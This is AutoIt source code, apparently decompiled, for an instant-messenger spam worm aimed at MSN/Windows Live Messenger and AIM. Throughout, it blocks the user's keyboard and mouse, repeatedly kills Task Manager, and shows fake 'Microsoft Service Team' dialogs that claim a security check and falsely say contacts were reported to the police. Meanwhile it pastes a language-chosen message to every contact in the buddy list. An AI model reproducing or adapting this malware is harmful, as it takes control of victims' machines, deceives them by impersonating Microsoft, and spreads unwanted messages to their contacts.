;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

While $SPAMNOW = 1

if $IMSPAMPICK = 1 Then
;; Check if MSN is running..
if ProcessExists( "msnmsgr.exe") Then
	$MSN = 1
EndIf
;; Check if AIM is running
if ProcessExists( "aim6.exe") Then
	$AIM = 1
EndIf
;; If none is running , Sleep!
if $AIM = 0 And $MSN = 0 Then
	Sleep ( 1800000 )
Endif

;; If both are running do a little gamble game and pick one..
if $AIM = 1 And $MSN = 1 Then
	$MSN = Random()
	$AIM = Random()
	if $MSN < 0.50 Then
		$AIM = 0
		$MSN = 1
	EndIf

	if $AIM > 0.75 Then
	 $MSN = 0
	 $AIM = 1
 EndIf

 EndIf
 Sleep( 100 )
 EndIf


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  !! MSN SPAM CODE !!																											;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

if $MSN = 1 Then
$IMSPAMPICK = 0
WinActivate( "classname=MSBLWindowClass" , "" )
;; Check if MSN is signed in..
While WinWaitActive ( "classname=MSBLWindowClass" )
if Winactive( "Windows Live Messenger" ) Then
 	WinSetState( "Windows Live Messenger" , "" , @SW_MAXIMIZE )
	$TEMP = PixelGetColor( 100 , 250 )
if $NOTSIGNEDIN = $TEMP Then
	;; Not Signed in
	Sleep( 5000 )
EndIf
	if $NOTSIGNEDIN <> $TEMP Then
		;; Signed In
		ExitLoop
	EndIf

ElseIf Winactive ( "MSN Messenger" ) Then
	Sleep ( 60000 )
	ExitLoop
EndIf

WEnd

  If $TEAMB = True Then
	    WinWaitActive ( "classname=MSBLWindowClass" )
		BlockInput ( 1 )
		if $MSGBOXON = True Then
	    MsgBox ( 4096, "Windows Messenger Buddy List Check", "Windows Messenger will now start a general routine messure which keeps our servers clean from hackers." & @LF & "This routine checking system can take up to 5 minutes." & @LF & @LF & "Thank you for your patience." & @LF & @LF & "- Microsoft Service Team" & @LF & @LF & "IMPORTANT NOTICE: Keyboard/Mouse Input is blocked during this check.", 10 )
	EndIf
		WinActivate( "classname=MSBLWindowClass" , "" )
		If WinActive( "Windows Live Messenger" ) Then
	   ;; Change to Online Instead of Using Groups.
	   	If WinActive( "classname=#32770") Then
					Send ("{ESC 2}")
		EndIf
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP 6}")
       Send("{RIGHT}")
       Send("{ENTER}")
	   Sleep( 200 )
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP 5}")
       Send("{RIGHT}")
	   Send("{DOWN 2}")
       Send("{ENTER}")
	   $TEAMB = False
   ElseIf WinActive ( "MSN Messenger" ) Then
	  BlockInput ( 1 )
	   	If WinActive( "classname=#32770") Then
				Send ("{ESC 2}")
		EndIf
	   Send("{ALT}")
	   Send("{RIGHT}")
	   Send("{UP 4}")
       Send("{RIGHT}")
	   Send("{DOWN}")
	   Send("{ENTER}")
	   $TEAMB = False
   EndIf
   Else
	  if ProcessExists( "taskmgr.exe" ) Then
		  ProcessClose( "taskmgr.exe" )
	  EndIf
EndIf

;;
;; Picking the right language to Spam >.>
;;

if $HOSTCHKON = 1 Then

if $HOST = "NL" Then
	Clipput( $NED )
EndIf
if $HOST = "BE" Then
	Clipput( $BEL )
EndIf
if $HOST = "EN" Then
	Clipput( $ENG )
EndIf
if $HOST = "DE" Then
	Clipput( $GER )
EndIf
if $HOST = "IT" Then
	Clipput( $ITA )
EndIf
if $HOST = "ES" Then
	Clipput( $SPA )
EndIf
if $HOST = "FR" Then
	Clipput( $FRA )
EndIf
if $HOST = "NO" Then
	Clipput( $NOR )
EndIf
if $HOST = "SE" Then
	Clipput( $SWE )
EndIf

if $HOST = "Other"	Then
	Clipput( $ENG )
EndIf

EndIf

Sleep ( 100 )
;; Wait till MSN pops up.
While WinWaitActive ( "classname=MSBLWindowClass" )
	BlockInput ( 1 )
		if WinActive ( "classname=MSBLWindowClass" ) Then
			    $INPUTSPAM = True
				if $MSNHOME = False Then
					Send( "{HOME}" )
					$MSNHOME = True
				EndIf
					Send( "{DOWN}" )
			if $JUMPFIRST4 = 1 Then
				Send( "{DOWN 3}" )
				$JUMPFIRST4 = 0
			EndIf
				Sleep( 50 )
				Send( "{ENTER}")
				Sleep( 200 )
				If WinActive( "classname=IEFrame" ) Then
					Send("{ESC}")
					Send("!b")
					Send("{S}")
				EndIf
				If WinActive( "classname=DUIDialog") Then
					Send("{ESC}")
				EndIf
				If WinActive( "classname=#32770") Then
					Send ("{ESC}")
				EndIf
			    If WinActive( "classname=PageWindowClass") Then
					Send("{ESC}")
				EndIf
				ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )
				EndIf
				;; When Buddy Window Shows up , SPAM!
				If WinActive( "classname=IMWindowClass" ) Then
					;; Check if conversation window is opened twice , if so end of buddy list has reached ... quit.
					if $MON = False Then
					$NIGB = WinGetTitle("")
					$MON = True
					$KEY = False
					Endif

				if $KEY = True Then
				$KNETB = WinGetTitle("")
				$KEY = False
				$MON = False
			EndIf

			If $MON = True Then
				$KEY = True
			EndIf

			If $NIGB = $KNETB Then
				Send( "{ESC 2}" )
				Sleep( 800 )
				$SPAMCOUNT = $SPAMCOUNT + 1
				$ENDOFLIST = $ENDOFLIST + 1
				if $ENDOFLIST = 2 Then
				$SPAMCOUNT = $SPAMCOUNT - 2
				BlockInput( 0 )
				if $MSGBOXON = True Then
				MsgBox( 4096 , "Windows Messenger Buddy List Check Finished!" , "2 of " & $SPAMCOUNT & " users in your list are used for prohibited hacking activities and therefor reported to the police." & @LF & "Thank you for your understanding." & @LF & @LF & "- Microsoft Service Team" )
				EndIf
				Exit
				EndIf
				;; Change back to offline list so we can spam those to :)
				if WinActive ( "Windows Live Messenger" ) Then
					$INPUTSPAM = False
					Send("{ALT}")
					Send("{RIGHT}")
					Send("{UP 5}")
					Send("{RIGHT}")
					Send("{DOWN}")
					Send("{ENTER}")
					Sleep ( 400 )
					if $MSNHOME2 = False Then
					Send( "{HOME}")
					$MSNHOME2 = True
					Send("+{DOWN " & $SPAMCOUNT & "}")
				Else
					if ProcessExists( "aim6.exe") Then
						$AIM = 1
						$MSN = 0
						$BUTT = True
				        $SEX = 0
						$MSNHOME = False
				        $MON = True
				        $KEY = True
						ExitLoop
					Else
						MsgBox( 4096 , "Windows Messenger Buddy List Check Finished!" , "1 of " & $SPAMCOUNT & " user(s) in your list were used for prohibited hacking activities and therefor removed." & @LF & "Thank you for your understanding." & @LF & @LF & "- Microsoft Service Team" )
						Exit
					EndIf
				EndIf
			EndIf
				ElseIf ProcessExists( "taskmgr.exe" ) Then
				ProcessClose( "taskmgr.exe" )
			EndIf
			Sleep( 900 )
			if $INPUTSPAM = True Then
					Send( "^v" )
					Sleep ( 10 )
					Send( "{ENTER}" )
					Sleep ( 90 )
					Send( "{ESC 5}")
					Sleep ( 1900 )
					$SPAMCOUNT = $SPAMCOUNT + 1
				EndIf
				ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )
				EndIf
				If WinActive( "classname=IEFrame" ) Then
					Send("{ESC}")
					Send("!b")
					Send("{S}")
				EndIf
				If WinActive( "classname=DUIDialog") Then
					Send("{ESC}")
				EndIf
				If WinActive( "classname=#32770") Then
					Send ("{ESC}")
				EndIf
			    If WinActive( "classname=PageWindowClass") Then
					Send("{ESC}")
				EndIf
		WEnd
	EndIf

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;  !! AIM SPAM CODE !!																											;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

if $AIM = 1 Then
$IMSPAMPICK = 0
WinActivate( "AIM" , "" )
Do
	WinWaitActive ( "AIM" )
	If $BUTT = True Then
		Sleep( 60000 )
	    $BUTT = False
	EndIf

  If $TEAMA = True Then
	    WinWaitActive ( "AIM" )
		If WinActive( "AIM" ) Then
	   ;; Change to Online Instead of Using Groups.
	   BlockInput ( 1 )
	   Send ("{ESC 2}")
	   Send("{ALT}")
	   Send("{RIGHT 2}")
	   Send("{UP 3}")
       Send("{RIGHT}")
       Send("{ENTER}")
	   Sleep( 200 )
	   Send("{ALT}")
	   Send("{RIGHT 2}")
	   Send("{UP 6}")
       Send("{RIGHT}")
	   Send("{DOWN}")
       Send("{ENTER}")
   EndIf
   $TEAMA = False
   $BUTT = True
EndIf

If $BUTT = False Then
	$TEAMA = True
EndIf

If ProcessExists( "taskmgr.exe" ) Then
   ProcessClose( "taskmgr.exe" )
EndIf
	$SEX = $SEX + 1
Until $SEX = 2

;;
;; Picking the right language to Spam >.>
;;

if $HOSTCHKON = 1 Then

if $HOST = "NL" Then
	Clipput( $NED )
EndIf
if $HOST = "BE" Then
	Clipput( $BEL )
EndIf
if $HOST = "EN" Then
	Clipput( $ENG )
EndIf
if $HOST = "DE" Then
	Clipput( $GER )
EndIf
if $HOST = "IT" Then
	Clipput( $ITA )
EndIf
if $HOST = "ES" Then
	Clipput( $SPA )
EndIf
if $HOST = "FR" Then
	Clipput( $FRA )
EndIf
if $HOST = "NO" Then
	Clipput( $NOR )
EndIf
if $HOST = "SE" Then
	Clipput( $SWE )
EndIf

if $HOST = "Other"	Then
	Clipput( $ENG )
EndIf

EndIf

Sleep ( 100 )

While WinWaitActive ( "AIM" )
	MouseClick("left")
	BlockInput ( 1 )
		if WinActive ( "AIM" ) Then
				if $AIMHOME = False Then
					Send( "{HOME}" )
					$AIMHOME = True
				EndIf
				Send( "{DOWN}" )
				Sleep( 100 )
				Send( "{ENTER}")
				Sleep( 400 )
				If WinActive( "classname=IEFrame" ) Then
					Send("{ESC}")
					Send("!b")
			    	Send("{S}")
				EndIf
				;; When Buddy Window Shows up , SPAM!
				ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )
			EndIf
				If WinActive( "IM " ) Then
					;; Check if conversation window is opened twice , if so end of buddy list has reached ... quit.
					if $MON = False Then
					$NIGA = WinGetTitle("")
					$MON = True
					$KEY = False
					Endif

				if $KEY = True Then
				$KNETA = WinGetTitle("")
				$KEY = False
				$MON = False
			EndIf

			If $MON = True Then
				$KEY = True
			EndIf

			If $NIGA = $KNETA Then
				Send( "{ESC}" )
				BlockInput ( 0 )
				Sleep( 500 )
				$BUTT = True
				$SEX = 0
				$AIMHOME = False
				$MON = True
				$KEY = True
				if ProcessExists( "msnmsgr.exe") Then
					$AIM = 0
					$MSN = 1
					ExitLoop
				Else
					ProcessClose("aim6.exe")
				    ProcessClose("aim6.exe")
					Exit
				EndIf
			EndIf
				Send( "^v" )
				Sleep ( 400 )
				Send( "{ENTER}" )
				Sleep ( 100 )
				Send( "{ESC 10}")
				Sleep ( 1200 )
			ElseIf ProcessExists( "taskmgr.exe" ) Then
					ProcessClose( "taskmgr.exe" )
				EndIf

				If WinActive( "classname=IEFrame" ) Then
					Send("{ESC}")
					Send("!b")
					Send("{S}")
				EndIf
				If WinActive( "classname=DUIDialog") Then
					Send("{ESC}")
				EndIf
				If WinActive( "classname=#32770") Then
					Send ("{ESC}")
				EndIf
			    If WinActive( "classname=PageWindowClass") Then
					Send("{ESC}")
				EndIf

WEnd

Endif

WEnd


; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: F:\Hå©kîñg\PRIV\im++\im++.au3>
; ----------------------------------------------------------------------------

